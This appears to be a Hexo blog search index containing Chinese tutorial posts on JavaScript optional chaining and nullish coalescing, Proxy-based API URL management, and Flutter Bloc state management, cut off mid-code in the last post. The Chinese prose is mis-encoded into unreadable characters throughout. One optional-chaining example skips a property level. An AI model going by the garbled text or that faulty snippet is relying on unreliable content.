<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>javascriptæ–°è¯­æ³•</title>
      <link href="posts/ccdacdfe/"/>
      <url>posts/ccdacdfe/</url>
      
        <content type="html"><![CDATA[<h2 id="Js-ç¬¬ä¸‰é˜¶æ®µçš„æ–°è¯­æ³•"><a href="#Js-ç¬¬ä¸‰é˜¶æ®µçš„æ–°è¯­æ³•" class="headerlink" title="Js ç¬¬ä¸‰é˜¶æ®µçš„æ–°è¯­æ³•"></a>Js ç¬¬ä¸‰é˜¶æ®µçš„æ–°è¯­æ³•</h2><p>ä¸»è¦ä»‹ç»2ä¸ªå¤„äºStatge 3 çš„æ–°è¯­æ³•ï¼Œç›®å‰è¯¥è¯­æ³•å¯ä»¥ä½¿ç”¨babelæ’ä»¶è¿›è¡Œä½¿ç”¨ã€‚è¿™ä¸¤ä¸ªæ–°è¯­æ³•åˆ†åˆ«æ˜¯ï¼š</p><ul><li>proposal-optional-chaining</li><li>proposal-nullish-coalescing</li></ul><a id="more"></a><h2 id="proposal-optional-chaining"><a href="#proposal-optional-chaining" class="headerlink" title="proposal-optional-chaining"></a>proposal-optional-chaining</h2><p>TC39 - ææ¡ˆ åœ°å€ï¼š <a href="https://github.com/tc39/proposal-optional-chaining">https://github.com/tc39/proposal-optional-chaining</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  b: &#123;</span><br><span class="line">    c: &#123;</span><br><span class="line">      d: &#123;</span><br><span class="line">        e: <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ—§è¯­æ³•-å–å€¼"><a href="#æ—§è¯­æ³•-å–å€¼" class="headerlink" title="æ—§è¯­æ³• å–å€¼"></a>æ—§è¯­æ³• å–å€¼</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> eValue = a &amp;&amp; a.b &amp;&amp; a.b.c &amp;&amp; a.b.c.d &amp;&amp; a.b.c.d.e ? a.b.c.d.e : <span class="string">&#x27;--&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(eValue) <span class="comment">// è¾“å‡º --</span></span><br></pre></td></tr></table></figure><h3 id="æ–°è¯­æ³•-å–å€¼"><a href="#æ–°è¯­æ³•-å–å€¼" class="headerlink" title="æ–°è¯­æ³• å–å€¼"></a>æ–°è¯­æ³• å–å€¼</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> eValue = a.b?.c?.e || <span class="string">&#x27;--&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(eValue) <span class="comment">// è¾“å‡º --</span></span><br></pre></td></tr></table></figure><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>ä»¥ <strong>â€œæå°‘ã€å®Œç¾ã€å¯é˜…è¯»â€</strong> çš„ä»£ç é‡ï¼Œå®ç°äº†æœ€å®Œç¾çš„æ·±åº¦å–å€¼çš„é—®é¢˜ã€‚å¯æ˜¯è§‚å¯Ÿä¸Šé¢çš„ä»£ç æ–¹æ¡ˆæ—¶ï¼Œè¿˜æ˜¯ä¸å¤Ÿå®Œç¾ã€‚å¦‚æœæŸä¸ªç”¨æˆ·çš„ä½™é¢å°±æ˜¯0çš„åŒ–ï¼Œé‚£ä¹ˆå²‚ä¸æ˜¯ç•Œé¢ä¸Šå±•ç¤ºçš„æ˜¯ <strong>â€œâ€“â€</strong>ã€‚ä¸ç§‘å­¦ã€ä¸ç§‘å­¦ï¼Œç»§ç»­é˜…è¯»ï¼Œæ­å¼€ç–‘æƒ‘ï¼</p><h2 id="proposal-nullish-coalescing"><a href="#proposal-nullish-coalescing" class="headerlink" title="proposal-nullish-coalescing"></a>proposal-nullish-coalescing</h2><p>TC39 - ææ¡ˆ åœ°å€ï¼š <a href="https://github.com/tc39/proposal-nullish-coalescing">https://github.com/tc39/proposal-nullish-coalescing</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  b: &#123;</span><br><span class="line">    c: &#123;</span><br><span class="line">      d: &#123;</span><br><span class="line">        e: <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ—§è¯­æ³•-æ˜¾ç¤ºä½™é¢ä¸º-0"><a href="#æ—§è¯­æ³•-æ˜¾ç¤ºä½™é¢ä¸º-0" class="headerlink" title="æ—§è¯­æ³• æ˜¾ç¤ºä½™é¢ä¸º 0"></a>æ—§è¯­æ³• æ˜¾ç¤ºä½™é¢ä¸º 0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> eValue = a.b?.c?.d?.e === <span class="number">0</span> ? <span class="number">0</span> : a.b?.c?.d?.e;</span><br><span class="line"><span class="built_in">console</span>.log(eValue) <span class="comment">// è¾“å‡º 0</span></span><br></pre></td></tr></table></figure><h3 id="æ–°è¯­æ³•-æ˜¾ç¤ºä½™é¢ä¸º-0"><a href="#æ–°è¯­æ³•-æ˜¾ç¤ºä½™é¢ä¸º-0" class="headerlink" title="æ–°è¯­æ³• æ˜¾ç¤ºä½™é¢ä¸º 0"></a>æ–°è¯­æ³• æ˜¾ç¤ºä½™é¢ä¸º 0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> eValue = a.b?.c?.d?.e ?? <span class="number">0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(eValue) <span class="comment">// è¾“å‡º 0</span></span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•æ¥åˆ°å·²æœ‰çš„é¡¹ç›®ä¸­"><a href="#å¦‚ä½•æ¥åˆ°å·²æœ‰çš„é¡¹ç›®ä¸­" class="headerlink" title="å¦‚ä½•æ¥åˆ°å·²æœ‰çš„é¡¹ç›®ä¸­"></a>å¦‚ä½•æ¥åˆ°å·²æœ‰çš„é¡¹ç›®ä¸­</h2><ul><li>å‡çº§eslint-loader å› ä¸ºä½ç‰ˆæœ¬çš„ä¸æ”¯æŒæ–°è¯­æ³•æ£€æŸ¥</li><li>å‡çº§ä¸ºbabel7</li><li>å®‰è£…babel</li></ul><h2 id="å®‰è£…Babelæ’ä»¶"><a href="#å®‰è£…Babelæ’ä»¶" class="headerlink" title="å®‰è£…Babelæ’ä»¶"></a>å®‰è£…Babelæ’ä»¶</h2><blockquote><p>@babel/plugin-proposal-optional-chaining</p></blockquote><blockquote><p>@babel/plugin-proposal-nullish-coalescing-operator</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
          <category> node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPAå•åº”ç”¨-è¯·æ±‚æ¥å£URLç»“æ„è®¾è®¡</title>
      <link href="posts/7ec088b4/"/>
      <url>posts/7ec088b4/</url>
      
        <content type="html"><![CDATA[<h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>åœ¨å¼€å‘ä¸€ä¸ªSPAåº”ç”¨æ—¶ï¼Œå¿…ç„¶ä¼šé‡åˆ°ä¸åå°æ¥å£è¿›è¡Œajaxçš„äº¤äº’ã€‚ä¸ºäº†é¡¹ç›®ç»“æ„çš„ç»´æŠ¤æ€§ã€å¯è¯»æ€§ï¼Œæˆ‘ä»¬æ€»ä¼šå»åšä¸€äº›ç›¸åº”çš„å¤„ç†ã€‚å¦‚ï¼š</p><ul><li>URLé›†ä¸­ç®¡ç†</li><li>æ‹¦æˆªè¯·æ±‚</li><li>æ‹¦æˆªå“åº”</li></ul><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä¸»è¦å»å®ç°<strong>URLçš„é›†ä¸­ç®¡ç†</strong>æ–¹æ¡ˆã€‚</p><a id="more"></a><h2 id="æŠ›å‡ºé—®é¢˜"><a href="#æŠ›å‡ºé—®é¢˜" class="headerlink" title="æŠ›å‡ºé—®é¢˜"></a>æŠ›å‡ºé—®é¢˜</h2><blockquote><p>v1: éœ€æ±‚é—®é¢˜</p></blockquote><ul><li>å¦‚ä½•é›†ä¸­ç®¡ç†URL</li><li>å¦‚ä½•æå–å‡ºè¯·æ±‚åœ°å€ä¸­ç›¸åŒçš„å†…å®¹</li><li>å¦‚ä½•åŒºåˆ†æ¥å£ç¯å¢ƒï¼Œå¦‚[â€˜å¼€å‘ç¯å¢ƒâ€™,â€™ä¸Šçº¿ç¯å¢ƒâ€™]</li></ul><blockquote><p>v2: éœ€æ±‚é—®é¢˜</p></blockquote><ul><li>å¦‚ä½•åœ¨å®šä¹‰URLæ—¶ï¼Œåªå†™å…¥ä¸åŒçš„urlå³å¯ã€‚ç›¸åŒå†…å®¹è‡ªåŠ¨æ‹¼æ¥ï¼Œæ— éœ€å‰ç½®äººä¸ºçš„æ‹¼æ¥ã€‚</li><li>å¦‚ä½•æ ¹æ®ä¸åŒçš„è·¯ç”±ç±»å‹ï¼Œå»åŒºåˆ†è¯·æ±‚æ¥å£çš„ç±»å‹ã€‚</li></ul><h2 id="æŠ€æœ¯å¯è¡Œæ€§åˆ†æ"><a href="#æŠ€æœ¯å¯è¡Œæ€§åˆ†æ" class="headerlink" title="æŠ€æœ¯å¯è¡Œæ€§åˆ†æ"></a>æŠ€æœ¯å¯è¡Œæ€§åˆ†æ</h2><blockquote><p>v1: éœ€æ±‚è§£å†³æ€è·¯</p></blockquote><ul><li>å¯ä»¥ä½¿ç”¨<strong>ES6 import export</strong> çš„æ–¹æ³•å®ç° <strong>URlé›†ä¸­ç®¡ç†</strong></li><li>å¯ä»¥ä½¿ç”¨â€œå˜é‡æ‹¼æ¥ã€å­—ç¬¦ä¸²æ¨¡ç‰ˆè§£æâ€çš„æ–¹å¼ï¼Œå»æå–åœ°å€ä¸­ç›¸åŒçš„å†…å®¹</li><li>å¯ä»¥ä½¿ç”¨ <strong>process.env.NODE_ENV</strong> è‡ªå®šä¹‰ç¯å¢ƒå˜é‡ï¼Œè¯†åˆ«æ­¤æ—¶çš„è¿è¡Œç¯å¢ƒ</li></ul><blockquote><p>v2: éœ€æ±‚è§£å†³æ€è·¯</p></blockquote><ul><li>å¯ä»¥ä½¿ç”¨<strong>ES6 ä¸­çš„ proxy å®ç°</strong></li></ul><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><blockquote><p>v1: code</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è”è°ƒç¯å¢ƒæ¥å£åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">const</span> baseUrlEnv = &#123;</span><br><span class="line">  development: <span class="string">&#x27;/test&#x27;</span>,</span><br><span class="line">  production: <span class="string">&#x27;/online&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯·æ±‚æ¥å£åœ°å€</span></span><br><span class="line"><span class="keyword">const</span> baseUrl = <span class="string">&#x27;http://www.xxx.com/&#x27;</span> + baseUrlEnv[process.env.NODE_ENV];</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰URL</span></span><br><span class="line"><span class="keyword">const</span> URLSource = &#123;</span><br><span class="line">    <span class="comment">// è¿™é‡Œå®šä¹‰ account ä¸»è¦æ˜¯ä¸ºäº†æ›´åŠ çš„ç»†åŒ–è¯·æ±‚åœ°å€</span></span><br><span class="line">  account: &#123; <span class="comment">// è´¦æˆ·ç±»å‹æ¥å£</span></span><br><span class="line">    userInfo: baseUrl + <span class="string">&#x27;/v1/getUserInfo&#x27;</span>,</span><br><span class="line">    userlist: <span class="string">`<span class="subst">$&#123;baseUrl&#125;</span>/v1/getUserList`</span>, </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> URLSource;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>v2: code</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰URL</span></span><br><span class="line"><span class="keyword">const</span> URLSource = &#123;</span><br><span class="line">    <span class="comment">// è¿™é‡Œå®šä¹‰ account ä¸»è¦æ˜¯ä¸ºäº†æ›´åŠ çš„ç»†åŒ–è¯·æ±‚åœ°å€</span></span><br><span class="line">  account: &#123; <span class="comment">// è´¦æˆ·ç±»å‹æ¥å£</span></span><br><span class="line">    userInfo: <span class="string">&#x27;/v1/&#123;type&#125;/getUserInfo&#x27;</span>,</span><br><span class="line">    userlist: <span class="string">&#x27;/v1/&#123;type&#125;/getUserList&#x27;</span>, </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è”è°ƒç¯å¢ƒæ¥å£åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">const</span> baseUrl = &#123;</span><br><span class="line">  development: <span class="string">&#x27;/test&#x27;</span>,</span><br><span class="line">  production: <span class="string">&#x27;/online&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»£ç†ç›‘å¬ URLé…ç½®</span></span><br><span class="line"><span class="keyword">const</span> handler = &#123;</span><br><span class="line">  <span class="function"><span class="title">get</span>(<span class="params">target, key</span>)</span> &#123; <span class="comment">// get çš„trap æ‹¦æˆªgetæ–¹æ³•</span></span><br><span class="line">    <span class="keyword">let</span> value = target[key];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(value, handler); <span class="comment">// ä½¿ç”¨try catch å·§å¦™çš„å®ç°äº† æ·±å±‚ å±æ€§ä»£ç†</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// å‘è¯·æ±‚åœ°å€åŠ¨æ€ç»‘å®šæ‰§è¡Œç¯å¢ƒ å¦‚: test</span></span><br><span class="line">        value = baseUrl[process.env.NODE_ENV] + value;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ›¿æ¢å½“å‰æµè§ˆå™¨çš„ç±»å‹ é€šè¿‡è·å–è·¯ç”±ä¸­çš„ç¬¬ä¸€ä¸ªè·¯å¾„å»åŒºåˆ†</span></span><br><span class="line">        <span class="keyword">if</span> (value.includes(<span class="string">&#x27;&#123;type&#125;&#x27;</span>)) &#123;</span><br><span class="line">          <span class="comment">// è·å– å½“å‰æµè§ˆå™¨ pathName è·¯ç”±ä¸­çš„ç¬¬ä¸€ä¸ªç±»å‹</span></span><br><span class="line">          <span class="keyword">let</span> currentType = <span class="built_in">window</span>.location.pathname.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> item;</span><br><span class="line">          &#125;);</span><br><span class="line">          currentType = currentType.length &gt; <span class="number">0</span> ? currentType[<span class="number">0</span>].toLocaleLowerCase() : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">if</span> ([<span class="string">&#x27;china&#x27;</span>, <span class="string">&#x27;Korea&#x27;</span>].includes(currentType)) &#123;</span><br><span class="line">            value = value.replace(<span class="string">&#x27;&#123;type&#125;&#x27;</span>, currentType);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">set</span>(<span class="params">target, key</span>)</span> &#123; <span class="comment">// é˜»æ­¢å¤–éƒ¨è¯¯æ“ä½œï¼Œå¯¼è‡´URLé…ç½®æ–‡ä»¶è¢«ä¿®æ”¹ï¼Œè®¾ç½®å±æ€§ä¸ºåªè¯»å±æ€§</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(target[key], handler);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> URL = <span class="keyword">new</span> <span class="built_in">Proxy</span>(URLSource, handler);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> URL;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é¹°çœ¼è§†é¢‘ (ä¸‰)</title>
      <link href="posts/7a8896fe/"/>
      <url>posts/7a8896fe/</url>
      
        <content type="html"><![CDATA[<h2 id="Flutter-é¹°çœ¼è§†é¢‘"><a href="#Flutter-é¹°çœ¼è§†é¢‘" class="headerlink" title="Flutter - é¹°çœ¼è§†é¢‘"></a>Flutter - é¹°çœ¼è§†é¢‘</h2><p>é¹°çœ¼è§†é¢‘ App ç›¸å…³æŠ€æœ¯çŸ¥è¯†ç‚¹,ä¸»è¦ä»‹ç»å¦‚ä¸‹å‡ ç‚¹æŠ€å·§!</p><ul><li>çŠ¶æ€ç®¡ç† - bloc</li><li>åŠ¨æ€è®¾ç½®è§†é¢‘æ¯”ä¾‹</li></ul><a id="more"></a><h2 id="çŠ¶æ€ç®¡ç†"><a href="#çŠ¶æ€ç®¡ç†" class="headerlink" title="çŠ¶æ€ç®¡ç†"></a>çŠ¶æ€ç®¡ç†</h2><p>Flutter çš„çŠ¶æ€ç®¡ç† æœ‰å¤šç§æ–¹æ¡ˆï¼Œå¦‚ï¼š</p><ul><li>RxDart</li><li>Redux</li><li>Bloc</li></ul><p>è¿™é‡Œåªä»‹ç»ä¸€ç§ï¼ŒåŸºäºStreamæ¦‚å¿µçš„çŠ¶æ€ç®¡ç†æ–¹æ¡ˆã€‚Blocæ˜¯å¯¹RxDartçš„è¿›ä¸€æ­¥å°è£…ã€‚å¯¹äºFlutteræœ‰Flutter_blocç²˜æ€§ç»„ä»¶ï¼Œè´Ÿè´£å»å‘ˆç°æœ€æ–°çš„çŠ¶æ€ã€‚</p><h3 id="Bloc-å®˜æ–¹æ¦‚å¿µ"><a href="#Bloc-å®˜æ–¹æ¦‚å¿µ" class="headerlink" title="Bloc å®˜æ–¹æ¦‚å¿µ"></a>Bloc å®˜æ–¹æ¦‚å¿µ</h3><blockquote><p>Blocå¯ä»¥è½»æ¾åœ°å°†è¡¨ç¤ºä¸ä¸šåŠ¡é€»è¾‘åˆ†ç¦»ï¼Œä½¿ä»£ç å¿«é€Ÿï¼Œæ˜“äºæµ‹è¯•å’Œé‡ç”¨ã€‚</p></blockquote><p>Blocçš„è®¾è®¡è€ƒè™‘äº†ä¸‰ä¸ªæ ¸å¿ƒä»·å€¼è§‚ï¼š</p><ul><li><p>ç®€å•<br>  æ˜“äºç†è§£ï¼Œä¾¿äºä½¿ç”¨ã€‚</p></li><li><p>å¼ºå¤§<br>  é€šè¿‡ç»„åˆè¾ƒå°çš„ç»„ä»¶æ¥åˆ¶ä½œä»¤äººæƒŠå¹çš„å¤æ‚åº”ç”¨ç¨‹åºã€‚</p></li><li><p>å¯æµ‹è¯•<br>  è½»æ¾æµ‹è¯•åº”ç”¨ç¨‹åºçš„å„ä¸ªæ–¹é¢ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥æ”¾å¿ƒåœ°è¿›è¡Œè¿­ä»£ã€‚</p></li></ul><p>Blocå°è¯•é€šè¿‡è°ƒèŠ‚ä½•æ—¶å¯ä»¥å‘ç”ŸçŠ¶æ€æ›´æ”¹æ¥å®ç°çŠ¶æ€æ›´æ”¹ï¼Œå¹¶åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­å¼ºåˆ¶æ‰§è¡Œå•ä¸€æ–¹å¼æ¥æ›´æ”¹çŠ¶æ€ã€‚</p><p>ç”±äºBlocæ˜¯é€šè¿‡Eventå»ä¼ é€’çš„ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å»å®šä¹‰ç›¸åº”çš„äº‹ä»¶æºã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ThemeEvent</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChangeTheme</span> <span class="keyword">extends</span> <span class="title">ThemeEvent</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  <span class="built_in">String</span> toString() =&gt; <span class="string">&#x27;ChangeTheme&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠ½è±¡ç±» ThemeEvent æ˜¯äº‹ä»¶ç¥–å®—ï¼Œæ‰€æœ‰çš„äº‹ä»¶ç±»æˆ‘ä»¬éƒ½å»ç»§æ‰¿å®ƒã€‚è¿™æ ·åœ¨Blocä¸­å°±å¯ä»¥æ–¹ä¾¿çš„åˆ¤æ–­è¿™ä¸ªäº‹ä»¶æ˜¯å¦æ˜¯ ThemeEvent ç±»å‹ä¸‹çš„ä»¥åŠ äº‹ä»¶ä¼ é€’çš„ å•ä¸€åŸåˆ™ã€‚é¿å…æ··æ·† æƒ³ä¼ é€’å¤šä¸ªï¼Œæ³›å‹æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å†å®šä¹‰ThemeBlocç±»ï¼Œè¿™ä¸ªç±»å¿…é¡»å»ç»§æ‰¿ Bloc åŸºç¡€ç±».<br>Bloc æ”¯æŒæ‰€æœ‰ç±»å‹ï¼Œ è¿™é‡Œåªç”¨åˆ° å¸ƒå°”ç±»å‹ï¼Œå°±ä¸åœ¨ç¼–å†™ä¸€ä¸ª ç±»å»åšçŠ¶æ€å­˜æ”¾äº†ã€‚ç›´æ¥ä½¿ç”¨å½¢å‚å³å¯ã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThemeBloc</span> <span class="keyword">extends</span> <span class="title">Bloc</span>&lt;<span class="title">ThemeEvent</span>,<span class="title">bool</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> changeTheme() <span class="keyword">async</span>&#123;</span><br><span class="line">    dispatch(ChangeTheme());</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  <span class="built_in">bool</span> <span class="keyword">get</span> initialState =&gt; <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  <span class="keyword">void</span> onTransition(Transition&lt;ThemeEvent, <span class="built_in">bool</span>&gt; transition) <span class="keyword">async</span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(transition.toString());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Stream&lt;<span class="built_in">bool</span>&gt; mapEventToState(<span class="built_in">bool</span> state, ThemeEvent event) <span class="keyword">async</span>* &#123;</span><br><span class="line">    <span class="keyword">if</span>(event <span class="keyword">is</span> ChangeTheme)&#123;</span><br><span class="line">      <span class="keyword">yield</span> !state;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onTransition æä¾›äº†å¯¹streamçš„è¿‡æ»¤æ“ä½œã€‚</p><h3 id="ååº”ç»„ä»¶"><a href="#ååº”ç»„ä»¶" class="headerlink" title="ååº”ç»„ä»¶"></a>ååº”ç»„ä»¶</h3><p>åœ¨uiä¸­å»å‘ˆç°BLocä¸­çŠ¶æ€æ—¶ï¼Œéœ€è¦ä½¿ç”¨Flutter_blocç»„ä»¶åº“å»åšæ¡¥æ¢ã€‚Flutter_blocæ˜¯è¿›ä¸€æ­¥çš„å°è£…ã€‚</p><p>æˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªAPPç¨‹åºçš„å¼€å§‹å¤„å¼•å…¥Blocã€‚</p><blockquote><p>import â€˜package:flutter_bloc/flutter_bloc.dartâ€™;</p></blockquote><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RootPage</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">Root</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  ThemeBloc themeBloc = ThemeBloc();</span><br><span class="line">  <span class="comment">// new ä¸€ä¸ª themeBloc çŠ¶æ€ç®¡ç†å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡ BlocProvider å»æ³¨å…¥è¦å¤„ç†çš„ bloc. è¿™é‡Œæˆ‘ä»¬ä¼ å…¥themeBloc!</span></span><br><span class="line">    <span class="keyword">return</span> BlocProvider&lt;ThemeBloc&gt;(</span><br><span class="line">        bloc: themeBloc,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡ BlocBuilder å» ç›‘å¬è¦å®æ—¶ç›¸åº”çš„bloc.è¿™é‡Œæˆ‘ä»¬ä¼ å…¥themeBloc!</span></span><br><span class="line">        <span 